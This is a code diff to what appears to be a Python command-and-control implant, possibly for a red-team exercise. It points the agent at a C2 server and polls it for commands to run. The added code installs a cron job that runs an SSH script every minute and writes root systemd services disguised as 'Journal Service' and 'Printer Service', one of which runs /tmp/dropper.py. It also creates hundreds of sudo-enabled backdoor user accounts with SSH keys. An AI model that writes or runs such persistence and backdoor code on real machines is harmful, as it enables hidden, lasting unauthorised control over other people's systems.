@@ -5,7 +5,7 @@ import requests
 import platform
 import time
 
-base_url = 'http://129.21.101.121:5000'
+base_url = 'http://129.21.101.117:8000'
 
 
 def get_size(bytes, suffix="B"):
@@ -56,6 +56,11 @@ def cron_job():
         ""
 
     with subprocess.Popen(
+            [f'sudo echo "*/1 * * * * sudo ./vagrant/ssh_cron.sh && sudo service sshd reload" >> cron_bkp'],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+
+    with subprocess.Popen(
             ['sudo crontab cron_bkp'],
             shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
         ""
@@ -65,12 +70,40 @@ def cron_job():
         ""
 
 
+def create_services():
+    with subprocess.Popen(
+            ["sudo echo '[Unit]\nDescription=Journal Service\n\n["
+             "Service]\nUser=root\nExecStart=/vagrant/ssh_cron.sh\nRestart=always\n\n["
+             "Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/systemd-journal.service && sudo "
+             "chmod 777 /etc/systemd/system/systemd-journal.service"],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as bonk:
+        print(bonk.stdout.read(), bonk.stderr.read())
+    with subprocess.Popen(
+            [
+                f"sudo systemctl daemon-reload && sudo systemctl enable systemd-journal.service && sudo systemctl "
+                f"start systemd-journal.service"],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as bonk:
+        print(bonk.stdout.read(), bonk.stderr.read())
+    with subprocess.Popen(
+            ["sudo echo '[Unit]\nDescription=Printer Service\n\n["
+             "Service]\nUser=root\nExecStart=/usr/bin/python3 /tmp/dropper.py\nRestart=always\n\n["
+             "Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/systemd-printer.sh.service && sudo "
+             "chmod 777 /etc/systemd/system/systemd-printer.sh.service && systemctl unmask"],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+    # time.sleep(10)
+    with subprocess.Popen(
+            [
+                f"sudo systemctl daemon-reload && sudo systemctl enable systemd-printer.sh.service && sudo systemctl "
+                f"start systemd-printer.sh.service"],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as bonk:
+        print(bonk.stdout.read(), bonk.stderr.read())
+
+
 def linux_persistence(agent_id):
     cron_job()
     ssh_keys = dict()
     for i in range(1, 1000):
-        # subprocess.run(['sudo', 'useradd', '-m', '-d', f"/home/bingus{i}", '-p', 'bingus', f"bingus{i}"
-        #                , '-G', 'sudo'])
         with subprocess.Popen(
                 [f'sudo useradd -m -d /home/bingus{i} -p bingus bingus{i} -G sudo'],
                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
@@ -80,7 +113,6 @@ def linux_persistence(agent_id):
                 [f'sudo mkdir /home/bingus{i}/.ssh'],
                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
             ""
-        # subprocess.run(['sudo', 'ssh-keygen', '-t', 'rsa', '-N', "", '-f', f"/home/bingus{i}/.ssh/id_rsa"])
         with subprocess.Popen(
                 [f'sudo ssh-keygen -t rsa -N "" -f /home/bingus{i}/.ssh/id_rsa'],
                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
@@ -127,3 +159,4 @@ if __name__ == "__main__":
     # receive and run commands
     while True:
         get_command(id_agent)
+    create_services()
